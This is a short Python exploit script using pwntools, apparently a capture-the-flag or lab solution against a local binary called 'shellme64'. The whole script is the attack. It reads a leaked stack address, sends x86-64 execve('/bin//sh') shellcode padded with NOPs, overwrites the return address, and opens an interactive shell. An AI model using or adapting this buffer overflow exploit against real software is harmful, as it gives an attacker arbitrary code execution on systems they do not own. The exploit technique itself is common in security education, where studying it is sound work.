from pwn import *

buffer_length = 40
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

app = process('./shellme64')
app.recvline()

buffer_address = int(app.recvline()[2:-1], 16)
payload = shellcode  + '\x90' * (buffer_length - len(shellcode)) + p64(buffer_address)

app.sendlineafter("> ", payload)
app.interactive()